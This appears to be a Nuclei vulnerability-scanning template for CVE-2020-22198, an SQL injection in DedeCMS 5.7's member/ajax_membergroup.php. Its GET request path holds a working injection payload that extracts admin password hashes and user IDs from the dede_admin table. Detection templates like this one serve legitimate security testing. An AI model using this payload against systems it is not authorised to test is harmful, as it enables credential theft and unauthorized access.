id: CVE-2020-22198

info:
  name: SQL Injection in DedeCMS 5.7 via mdescription
  author: ProjectDiscoveryAI
  severity: critical
  description: SQL Injection vulnerability in DedeCMS 5.7 via mdescription parameter to member/ajax_membergroup.php.
  impact: |
    Allows attackers to execute arbitrary SQL queries, potentially leading to data leakage or unauthorized access.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version of DedeCMS.
  reference:
    - https://github.com/blindkey/DedeCMSv5/issues/1
    - https://github.com/dedetech/DedeCMSv5/blob/master/src/member/ajax_membergroup.php

http:
  - method: GET
    path:
      - "{{BaseURL}}/ccpAdvert/member/ajax_membergroup.php?action=despost&mdescription=1', description%3D@', description%3D(select%20concat(pwd,0x23416e6f6e796d6f757323,userid)%20from%20dede_admin)%23"

    matchers:
      - type: word
        words:
          - "concat(pwd"
          - "userid"
        part: body
        condition: and
